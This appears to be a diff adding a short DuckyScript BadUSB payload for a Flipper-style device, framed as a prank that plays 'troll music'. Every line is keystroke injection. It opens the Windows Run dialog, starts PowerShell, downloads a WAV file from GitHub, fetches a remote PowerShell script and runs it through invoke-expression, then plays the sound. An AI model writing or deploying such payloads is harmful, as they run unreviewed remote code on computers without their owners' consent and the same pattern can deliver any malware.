@@ -1,0 +1,13 @@
+GUI r
+DELAY 250
+STRING powershell
+ENTER
+DELAY 250
+STRING iwr https://github.com/ConDaCat/flipper/raw/main/TrollMusic.wav?dl=1 -O $Env:USERPROFILE\Desktop\trollMusic.wav
+ENTER
+DELAY 3100
+STRING $pl = iwr https://raw.githubusercontent.com/ConDaCat/flipper/main/playSoundFunction.ps1?dl=1; invoke-expression $pl
+ENTER
+DELAY 250
+STRING PlaySound "$Env:USERPROFILE\Desktop\trollMusic.wav"
+ENTER
